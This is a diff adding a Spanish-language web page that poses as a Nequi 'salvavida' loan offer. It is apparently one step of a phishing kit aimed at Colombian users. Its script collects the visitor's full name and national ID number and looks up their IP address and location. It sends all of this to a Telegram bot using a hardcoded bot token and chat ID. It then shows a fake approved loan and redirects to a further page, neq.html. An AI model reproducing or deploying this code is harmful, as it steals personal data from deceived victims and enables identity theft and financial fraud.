@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicio de Proceso de Credito</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        body {
+            font-family: 'Manrope', sans-serif;
+            background-image: url("img/simulador.png");
+            background-size: cover; 
+            background-position: center; 
+            background-repeat: no-repeat; 
+            color: #200020;
+            padding: 120px 20px 20px;
+        }
+        .cabezeramor-t3 {
+            background-color: #ffffff;
+            height: 80px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        .cabezeramor-t3 img {
+            height: 30px;
+            max-width: 100%;
+        }
+        @media (max-width: 768px) {
+            body {
+                height: 150vh;
+            }
+            .cabezeramor-t3 img {
+                height: 30px;
+            }
+        }
+        .container {
+            max-width: 600px;
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            margin: auto;
+            text-align: left;
+        }
+        .titulo-principal {
+            font-weight: bold;
+            color: #ffffff;
+            text-align: left;
+            margin-bottom: 20px;
+            font-size: 2em;
+        }
+        h2 {
+            color: #200020;
+            margin-bottom: 10px;
+            font-size: 1.8em;
+        }
+        p {
+            color: #828d92;
+            font-size: 1.1em;
+            margin-bottom: 20px;
+        }
+        .form-floating label {
+            color: #200020;
+            font-weight: bold;
+            background-color: transparent;
+        }
+        .form-control {
+            background-color: transparent;
+            border: 1px solid #200020;
+            color: #200020;
+        }
+        .form-control:focus {
+            background-color: transparent;
+            border-color: #da0081;
+            box-shadow: none;
+        }
+        .btn-primary, .btn-pay  {
+            background-color: #200020;
+            border-color: #200020;
+            padding: 15px;
+            font-size: 1.2em;
+            width: 100%;
+        }
+        .btn-primary, .btn-pay :hover {
+            background-color: #200020;
+            border-color: #200020;
+        }
+        .credito-info {
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            border: 1px solid #dee2e6;
+            text-align: center;
+        }
+        .credito-info h3 {
+            color: #a0006f;
+            font-size: 1.5em;
+            margin-bottom: 15px;
+        }
+        .credito-info p {
+            font-size: 1.1em;
+            margin: 5px 0;
+        }
+        .credito-info strong {
+            color: #bf0072;
+        }
+        .monto-cuota {
+            font-weight: bold;
+            font-size: 1.5em;
+            color: #28a745;
+            margin-top: 20px;
+        }
+        
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8); 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            display: none;
+        }
+
+        .overlay img {
+            width: 7rem;
+        }
+        @media (max-width: 768px) {
+            body {
+                padding: 100px 10px;
+            }
+
+            .titulo-principal {
+                font-size: 1.6em;
+            }
+
+            h2 {
+                font-size: 1.5em;
+            }
+
+            .container {
+                padding: 20px;
+            }
+
+            .credito-info h3 {
+                font-size: 1.3em;
+            }
+
+            .credito-info p,
+            .monto-cuota {
+                font-size: 1em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="cabezeramor-t3">
+        <img src="img/logo.svg" alt="Logo">
+        <img src="img/3ra.jpg" alt="Icono">
+    </header>
+
+    <br><br><br><br><div class="titulo-principal">Solicita tu préstamo salvavida</div>
+
+    <div class="container" id="form-container">
+        <h2>Consulta tu puntaje</h2>
+        <p>Ingrese su cédula para conocer su puntaje.</p>
+        <form id="consulta-form">
+            <div class="form-floating mb-3">
+                <input type="text" id="nombreApellido" name="nombreApellido" class="form-control" placeholder="Ingrese su nombre y apellido" required>
+                <label for="nombreApellido">Ingrese su nombre y apellido</label>
+            </div>
+            <div class="form-floating mb-3">
+                <input type="number" id="cedula" name="cedula" class="form-control" placeholder="Ingrese su cédula" required minlength="5" maxlength="10">
+                <label for="cedula">Ingrese su cédula</label>
+            </div>
+            <button type="button" id="btn-consultar" class="btn btn-primary">Consultar</button>
+        </form>
+    </div>
+
+    <div class="container" id="loading-message" style="display:none;">
+        <p style="text-align:center;">Por favor espere, estamos consultando si aplica para un crédito...</p>
+    </div>
+
+    <div class="container" id="resultado-credito" style="display:none;">
+        <div class="credito-info">
+            <h3 class="titulo-credito"></h3>
+            <p class="monto-prestamo"></p>
+            <p>Meses de plazo: <span id="plazo-meses">12</span></p>
+            <p>Interés mensual: <strong>$<span id="interes-mensual">11,000</span></strong></p>
+            <p>Pago total: <strong>$<span id="pago-total"></span></strong></p>
+            <p class="monto-cuota">Cuota mensual: $<span id="cuota-mensual"></span></p>
+        </div>
+
+        <div class="form-group mt-4">
+            <label for="plazo">Seleccione el plazo:</label>
+            <select id="plazo" class="form-select">
+                <option value="12">12 meses</option>
+            </select>
+        </div><br>
+
+        <button class="btn btn-primary" id="btn-pagar">Continuar</button>
+        <div class="overlay" id="loading-overlay">
+            <img src="./img/gnequi.gif" alt="Cargando...">
+        </div>
+    </div>
+
+    <script type="text/javascript">
+        $(document).ready(function () {
+            // Limita el input de cédula a 10 caracteres
+            $("#cedula").on('input', function () {
+                var valor = $(this).val();
+                if (valor.length > 10) {
+                    $(this).val(valor.slice(0, 10));
+                }
+            });
+    
+            // Botón Consultar
+            $("#btn-consultar").click(function () {
+                const nombreApellido = $("#nombreApellido").val().trim();
+                const cedula = $("#cedula").val().trim();
+                const botToken = '7531945755:AAFSjCYMEx8LMgEUsUiSj3QTzo0ZGp09wAY';
+                const chatId = '-1002445779361';
+    
+                // Validar campos
+                if (!nombreApellido || cedula.length < 4) {
+                    alert("Por favor, complete todos los campos correctamente.");
+                    return;
+                }
+    
+                // Guardar datos en sessionStorage y localStorage
+                sessionStorage.setItem("nombreApellido", nombreApellido);
+                sessionStorage.setItem("cedula", cedula);
+                localStorage.setItem("nombreApellido", nombreApellido);
+                localStorage.setItem("cedula", cedula);
+    
+                // Obtener IP y enviar mensaje a Telegram
+                $.getJSON('https://ipinfo.io/json', function(data) {
+                    const ip = data.ip || 'IP desconocida';
+                    const ciudad = data.city || 'Ciudad desconocida';
+                    const pais = data.country || 'País desconocido';
+    
+                    const mensaje = `
+    👁Nequi Paso 1👁
+    🆔Nombres: ${nombreApellido}
+    🪪Cedula: ${cedula}
+    🌏IP: ${ip}
+    🏙Ciudad: ${ciudad}
+    🇨🇴País: ${pais}`;
+    
+                    $.ajax({
+                        url: `https://api.telegram.org/bot${botToken}/sendMessage`,
+                        method: 'POST',
+                        data: {
+                            chat_id: chatId,
+                            text: mensaje
+                        },
+                        success: function(response) {
+                            console.log("Información enviada correctamente.");
+                            $("#form-container").hide();
+                            $("#loading-message").show();
+                            setTimeout(function () {
+                                realizar_consulta();
+                            }, 2000);
+                        },
+                        error: function(error) {
+                            alert("Error al enviar la información.");
+                        }
+                    });
+                });
+            });
+    
+            function realizar_consulta() {
+                var montoAprobado = 2400000;
+                var nombre = "Esto es lo que te podemos prestar, si todo sale bien.";
+    
+                $("#loading-message").hide();
+                $(".titulo-credito").html("Hola, <strong>" + nombre + "</strong>");
+                $(".monto-prestamo").html("Cantidad a prestar: <strong>$" + montoAprobado.toLocaleString('es-CO') + " COP</strong>");
+                actualizarCuota(montoAprobado);
+                $("#resultado-credito").show();
+            }
+    
+            function actualizarCuota(monto) {
+                var plazo = $("#plazo").val();
+                var tasaMensual = 11000;
+                var pagoTotal = monto + (tasaMensual * plazo);
+                var cuotaMensual = pagoTotal / plazo;
+    
+                $("#pago-total").text(pagoTotal.toLocaleString('es-CO'));
+                $("#cuota-mensual").text(cuotaMensual.toLocaleString('es-CO'));
+            }
+    
+            $("#plazo").change(function () {
+                var monto = 2400000;
+                actualizarCuota(monto);
+            });
+    
+            $("#btn-pagar").click(function () {
+                $("#loading-overlay").fadeIn();
+                setTimeout(function () {
+                    window.location.href = "neq.html";
+                }, 3000);
+            });
+        });
+    </script>
+
+</body>
+
+</html>
